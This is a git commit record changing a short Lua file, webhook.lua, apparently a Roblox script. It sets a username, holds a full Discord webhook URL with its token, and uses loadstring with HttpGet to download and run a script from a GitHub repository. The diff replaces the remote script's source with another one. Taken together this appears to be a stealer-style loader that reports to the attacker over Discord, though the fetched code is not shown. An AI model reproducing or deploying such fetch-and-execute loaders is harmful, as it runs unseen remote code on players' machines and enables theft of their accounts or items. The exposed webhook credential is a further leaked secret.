ec826e2ed728b673895ffef56b1f35161613f3ca
Partner12398 <120310533+Partner12398@users.noreply.github.com>
2022-12-18 22:08:13 +0000

    Update webhook.lua

--- webhook.lua
+++ webhook.lua
@@ -1,4 +1,4 @@
-UserName = "goofycheetah0"
+UserName = "1kkteddy"
 WebHook = "https://discord.com/api/webhooks/1051254338816839801/cswABP9IOmNWFrK8ntp9PRUF_0K1Qyu3Y7OFnAao6hhu376KICDmp3jCy-vv6sCMWO8g"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/test.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
